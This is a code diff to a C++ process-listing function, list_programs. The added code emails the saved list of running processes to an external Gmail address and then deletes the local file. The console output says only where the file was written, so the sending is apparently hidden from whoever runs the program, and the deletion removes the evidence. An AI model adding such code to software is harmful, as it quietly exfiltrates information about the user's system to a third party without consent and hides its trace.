@@ -1,4 +1,5 @@
 #include "listProgram.h"
+#include <filesystem>
 
 void list_programs() {
   const string filename = "process_list.txt";
@@ -38,5 +39,20 @@ void list_programs() {
   outFile << "==========================" << endl;
   outFile.close();
 
-  cout << "Process list written to: " << filename << endl;
+  cout << "Process list written to: " << std::filesystem::absolute(filename) << endl;
+
+
+  Sleep(1000);
+    ifstream test_file("process_list.txt");
+    if (test_file.good()) {
+      test_file.close();
+      send_email_with_attachment(
+          "serverbottestmmt@gmail.com", "Running Process List",
+          "Attached is the current process list.", "process_list.txt");
+    } else {
+      cerr << "Failed to create process list file" << endl;
+    }
+  
+  if (!std::filesystem::remove(filename)) 
+      cerr << "Failed to delete the file." << endl;
 }
